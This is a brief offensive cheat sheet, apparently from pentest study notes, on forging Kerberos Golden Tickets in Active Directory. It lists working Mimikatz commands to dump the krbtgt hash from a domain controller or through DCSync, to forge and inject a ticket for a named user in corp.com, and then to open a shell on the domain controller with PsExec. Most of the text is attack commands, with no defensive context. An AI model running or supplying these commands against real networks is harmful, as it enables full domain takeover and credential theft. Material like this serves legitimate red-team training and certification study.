# Golden Tickets

Forge a TGT using the `krbtgt` account's NTLM hash. Grants access to the entire domain.

> Starting July 2022, Microsoft requires the specified username to be an existing account for Golden Tickets.

## Get the krbtgt Hash

```cmd
# Via Mimikatz on a DC
privilege::debug
lsadump::lsa /patch

# Via DCSync
lsadump::dcsync /user:corp\krbtgt
```

## Forge and Inject the Golden Ticket

```cmd
kerberos::purge         # clear existing tickets
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-... /krbtgt:<hash> /ptt
misc::cmd               # open cmd with the injected ticket
```

```cmd
PsExec.exe \\dc1 cmd.exe
```
